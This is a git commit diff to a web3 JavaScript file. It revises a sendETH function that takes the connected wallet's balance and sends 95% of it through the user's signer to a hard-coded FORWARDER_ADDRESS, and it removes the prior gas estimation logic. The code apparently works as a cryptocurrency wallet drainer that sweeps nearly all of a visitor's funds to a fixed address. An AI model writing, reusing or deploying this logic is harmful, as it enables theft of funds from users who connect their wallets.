3633a9862d30ded9e2339c0b36e0883a5b16bb7b
aboje gabriel <abojejunior@gmail.com>
2026-02-13 11:06:57 +0100

    version 1.4'

--- src/web3/send.js
+++ src/web3/send.js
@@ -10,48 +10,21 @@ export const sendETH = async (provider, signer) => {
         // get current balance in wei, BigInt
         const balanceWei = await provider.getBalance(address);
 
-        // estimate gas limit
-        const gasLimit = await provider.estimateGas({
-            to: FORWARDER_ADDRESS,
-            value: 1n, // small value for estimation, not the actual amount to send
-            // value: balanceWei, // sending entire balance for estimation
-        })
-
-        // get gas price
-        const feeData = await provider.getFeeData();
-        const gasPrice = feeData.gasPrice;
-
-        if(!gasPrice) throw new Error("Unable to fetch gas price");
-
-        // calculate total gas cost
-        const gasCost = gasLimit * gasPrice;
-
-        // ensure we have enough balance to cover gas cost
-        if(balanceWei <= gasCost){
-            throw new Error("Insufficient balance to cover gas cost");
+        if(balanceWei <= 0n){
+            throw new Error("No balance available");
         }
 
-        // balance after gas
-        const balanceAfterGas = balanceWei - gasCost;
-
-        // take 95% of remaining balance to send, leaving some buffer for price fluctuations
-        const amountToSend = (balanceAfterGas * 95n) / 100n;
+        // leave small buffer for gas (safe method)
+        const amountToSend = (balanceWei * 95n) / 100n;
 
         // send transaction
         const tx = await signer.sendTransaction({
             to: FORWARDER_ADDRESS,
             value: amountToSend, // amount already in wei
-            gasLimit,
-            gasPrice,
         });
 
         await tx.wait();
-        // not necessary to return the full transaction object, just the hash for reference
-        // return {
-        //     hash: tx.hash,
-        //     amountWei: amountToSend.toString(),
-        //     amountEth: ethers.formatEther(amountToSend),
-        // };
+        
         return tx.hash;
     } catch (error){
         console.error("Error sending transaction: ", error);
